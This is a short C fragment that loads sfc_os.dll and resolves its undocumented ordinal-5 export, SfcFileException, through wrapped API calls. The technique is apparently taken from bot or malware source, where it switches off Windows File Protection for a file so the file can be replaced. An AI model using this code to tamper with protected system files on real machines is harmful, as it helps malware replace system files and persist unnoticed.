
HANDLE _SFC_OS=0;
DWORD (WINAPI *_SfcFileException)(HANDLE rpc,LPCWSTR fname,DWORD type);


char sfcosHandleStr[] = "sfc_os.dll";


void InitSFC_OS()
{
	_SFC_OS = _GetModuleHandle(sfcosHandleStr);
	if (_SFC_OS == NULL)
		_SFC_OS = _LoadLibrary(sfcosHandleStr);
	if (_SFC_OS == NULL)
		return; // no sfc_os.dll

	_SfcFileException = (DWORD *)_GetProcAddress(_SFC_OS,(LPCSTR)5);
}
